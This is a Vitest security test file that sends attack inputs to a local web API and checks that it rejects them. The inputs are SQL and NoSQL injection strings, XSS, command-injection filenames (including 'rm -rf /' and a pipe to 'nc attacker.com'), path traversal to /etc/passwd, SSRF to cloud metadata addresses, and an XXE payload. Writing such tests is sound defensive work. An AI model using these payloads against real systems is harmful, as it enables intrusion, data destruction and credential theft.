/**
 * API Security Tests
 *
 * Tests for common API vulnerabilities:
 * - SQL Injection
 * - Authentication bypass
 * - Authorization issues
 * - Rate limiting
 * - Input validation
 */

import { describe, it, expect } from 'vitest';

const API_BASE_URL = process.env.NEXT_PUBLIC_APP_URL || 'http://localhost:9001';

describe('API Security - SQL Injection Protection', () => {
  it('should reject SQL injection in query parameters', async () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users--",
      "1' UNION SELECT NULL--",
      "admin'--",
      "' OR 1=1--",
    ];

    for (const payload of sqlInjectionPayloads) {
      const response = await fetch(`${API_BASE_URL}/api/users?id=${encodeURIComponent(payload)}`);

      // Should not return 200 with SQL injection
      expect(response.status).not.toBe(200);

      const text = await response.text();

      // Should not leak database errors
      expect(text.toLowerCase()).not.toContain('sql');
      expect(text.toLowerCase()).not.toContain('database');
      expect(text.toLowerCase()).not.toContain('syntax error');
    }
  });

  it('should sanitize input in POST requests', async () => {
    const maliciousInputs = {
      email: "admin@test.com'; DROP TABLE users--",
      name: "<script>alert('xss')</script>",
      phone: "1234567890' OR '1'='1",
    };

    const response = await fetch(`${API_BASE_URL}/api/profile`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(maliciousInputs),
    });

    // Should reject or sanitize
    const data = await response.json();

    if (response.ok) {
      // If accepted, data should be sanitized
      expect(data).not.toContain('<script>');
      expect(data).not.toContain('DROP TABLE');
    }
  });
});

describe('API Security - Authentication & Authorization', () => {
  it('should reject requests without authentication token', async () => {
    const protectedEndpoints = [
      '/api/profile',
      '/api/wallet/transactions',
      '/api/orders',
    ];

    for (const endpoint of protectedEndpoints) {
      const response = await fetch(`${API_BASE_URL}${endpoint}`);

      // Should return 401 Unauthorized
      expect([401, 403]).toContain(response.status);
    }
  });

  it('should reject invalid JWT tokens', async () => {
    const invalidTokens = [
      'invalid.jwt.token',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
      '',
      'null',
    ];

    for (const token of invalidTokens) {
      const response = await fetch(`${API_BASE_URL}/api/profile`, {
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      });

      expect([401, 403]).toContain(response.status);
    }
  });

  it('should prevent admin access without admin role', async () => {
    const adminEndpoints = [
      '/api/admin/users',
      '/api/admin/settings',
      '/api/admin/payments',
    ];

    for (const endpoint of adminEndpoints) {
      const response = await fetch(`${API_BASE_URL}${endpoint}`);

      // Should return 401 or 403
      expect([401, 403]).toContain(response.status);
    }
  });
});

describe('API Security - Rate Limiting', () => {
  it('should enforce rate limits on authentication endpoints', async () => {
    const requests = [];

    // Send 20 rapid requests
    for (let i = 0; i < 20; i++) {
      requests.push(
        fetch(`${API_BASE_URL}/api/auth/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: 'test@test.com', password: 'test123' }),
        })
      );
    }

    const responses = await Promise.all(requests);
    const rateLimited = responses.filter(r => r.status === 429);

    // Should have at least some rate limited responses
    expect(rateLimited.length).toBeGreaterThan(0);
  }, 15000); // Extended timeout

  it('should include rate limit headers', async () => {
    const response = await fetch(`${API_BASE_URL}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'test@test.com', password: 'test123' }),
    });

    // Rate limit headers might be present
    const headers = response.headers;

    // Check if rate limiting is configured (headers present when limit reached)
    if (response.status === 429) {
      expect(headers.has('x-ratelimit-limit') || headers.has('retry-after')).toBe(true);
    }
  });
});

describe('API Security - Input Validation', () => {
  it('should validate email format', async () => {
    const invalidEmails = [
      'not-an-email',
      '@test.com',
      'test@',
      'test..test@test.com',
      'test@test',
    ];

    for (const email of invalidEmails) {
      const response = await fetch(`${API_BASE_URL}/api/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password: 'Test123!' }),
      });

      expect(response.status).toBe(400);
    }
  });

  it('should validate payment amounts', async () => {
    const invalidAmounts = [
      -100,      // Negative
      0,         // Zero
      0.49,      // Below minimum
      1000000,   // Above maximum
      NaN,       // Not a number
      Infinity,  // Infinity
    ];

    for (const amount of invalidAmounts) {
      const response = await fetch(`${API_BASE_URL}/api/payments/stripe/create-checkout`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          amount: amount * 100, // Convert to cents
          currency: 'usd',
          description: 'Test payment',
        }),
      });

      // Should reject invalid amounts
      expect([400, 401, 422]).toContain(response.status);
    }
  });

  it('should reject oversized payloads', async () => {
    // Create a large payload (> 2MB based on next.config.ts)
    const largePayload = {
      data: 'x'.repeat(3 * 1024 * 1024), // 3MB
    };

    const response = await fetch(`${API_BASE_URL}/api/test`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(largePayload),
    });

    // Should reject or handle gracefully
    expect([400, 413, 500]).toContain(response.status);
  }, 10000);
});

describe('API Security - CSRF Protection', () => {
  it('should require CSRF token for state-changing operations', async () => {
    const response = await fetch(`${API_BASE_URL}/api/profile`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: 'Test' }),
    });

    // Should require CSRF token (403) or auth (401)
    expect([401, 403]).toContain(response.status);
  });
});

describe('API Security - Information Disclosure', () => {
  it('should not expose stack traces in production errors', async () => {
    const response = await fetch(`${API_BASE_URL}/api/nonexistent-endpoint`);
    const text = await response.text();

    // Should not expose internal paths
    expect(text).not.toContain('/home/');
    expect(text).not.toContain('/usr/');
    expect(text).not.toContain('node_modules');
    expect(text).not.toContain('.ts:');
    expect(text).not.toContain('Error:');
  });

  it('should not expose sensitive headers', async () => {
    const response = await fetch(`${API_BASE_URL}/api/test`);

    // Should not expose internal information
    expect(response.headers.get('x-powered-by')).toBeNull();
  });
});

describe('API Security - CORS Configuration', () => {
  it('should have restrictive CORS policy', async () => {
    const response = await fetch(`${API_BASE_URL}/api/test`, {
      headers: {
        'Origin': 'https://malicious-site.com',
      },
    });

    const corsHeader = response.headers.get('access-control-allow-origin');

    // Should not allow arbitrary origins
    if (corsHeader) {
      expect(corsHeader).not.toBe('*');
      expect(corsHeader).not.toBe('https://malicious-site.com');
    }
  });
});

describe('API Security - HTTP Methods', () => {
  it('should only allow appropriate HTTP methods', async () => {
    const methods = ['TRACE', 'TRACK', 'DEBUG'];

    for (const method of methods) {
      const response = await fetch(`${API_BASE_URL}/api/test`, {
        method,
      });

      // Should reject dangerous methods
      expect([400, 405, 501]).toContain(response.status);
    }
  });
});


describe('API Security - NoSQL Injection Protection', () => {
  it('should prevent NoSQL injection in query parameters', async () => {
    const maliciousPayloads = [
      { $gt: '' },
      { $ne: null },
      { $regex: '.*' },
      { $where: 'this.password.length > 0' },
    ];

    for (const payload of maliciousPayloads) {
      const response = await fetch(`${API_BASE_URL}/api/users`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ filter: payload }),
      });

      // Should reject or sanitize NoSQL operators
      expect([400, 401, 403, 404]).toContain(response.status);
    }
  });

  it('should validate and sanitize MongoDB-like operators', async () => {
    const response = await fetch(`${API_BASE_URL}/api/search`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        query: { $or: [{ admin: true }, { role: 'admin' }] },
      }),
    });

    // Should reject operator injection
    expect([400, 401, 403, 404]).toContain(response.status);
  });
});

describe('API Security - Command Injection Protection', () => {
  it('should prevent command injection in file operations', async () => {
    const maliciousFilenames = [
      '../../../etc/passwd',
      'file.txt; rm -rf /',
      'file.txt && cat /etc/passwd',
      'file.txt | nc attacker.com 1234',
      '$(whoami).txt',
      '`cat /etc/passwd`.txt',
    ];

    for (const filename of maliciousFilenames) {
      const response = await fetch(`${API_BASE_URL}/api/files`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ filename }),
      });

      // Should reject malicious filenames
      expect([400, 401, 403, 404]).toContain(response.status);
    }
  });
});

describe('API Security - Path Traversal Protection', () => {
  it('should prevent directory traversal attacks', async () => {
    const maliciousPaths = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/passwd',
      'C:\\Windows\\System32\\config\\SAM',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
    ];

    for (const path of maliciousPaths) {
      const response = await fetch(`${API_BASE_URL}/api/files/${encodeURIComponent(path)}`);

      // Should reject path traversal attempts
      expect([400, 403, 404]).toContain(response.status);
    }
  });

  it('should sanitize file paths before processing', async () => {
    const response = await fetch(`${API_BASE_URL}/api/download`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        path: '../../sensitive-data.txt',
      }),
    });

    // Should reject or sanitize the path
    expect([400, 403, 404]).toContain(response.status);
  });
});

describe('API Security - Server-Side Request Forgery (SSRF)', () => {
  it('should prevent SSRF via URL parameters', async () => {
    const maliciousUrls = [
      'http://localhost:3000/admin',
      'http://127.0.0.1:3000/admin',
      'http://169.254.169.254/latest/meta-data/',
      'http://metadata.google.internal/computeMetadata/v1/',
      'file:///etc/passwd',
      'gopher://localhost:25',
    ];

    for (const url of maliciousUrls) {
      const response = await fetch(`${API_BASE_URL}/api/fetch-url`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url }),
      });

      // Should reject internal/local URLs
      expect([400, 403, 404]).toContain(response.status);
    }
  });
});

describe('API Security - XML External Entity (XXE) Protection', () => {
  it('should prevent XXE attacks in XML parsing', async () => {
    const xxePayload = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>`;

    const response = await fetch(`${API_BASE_URL}/api/parse-xml`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/xml' },
      body: xxePayload,
    });

    // Should reject or safely parse XML without external entities
    expect([400, 403, 404, 415]).toContain(response.status);
  });
});
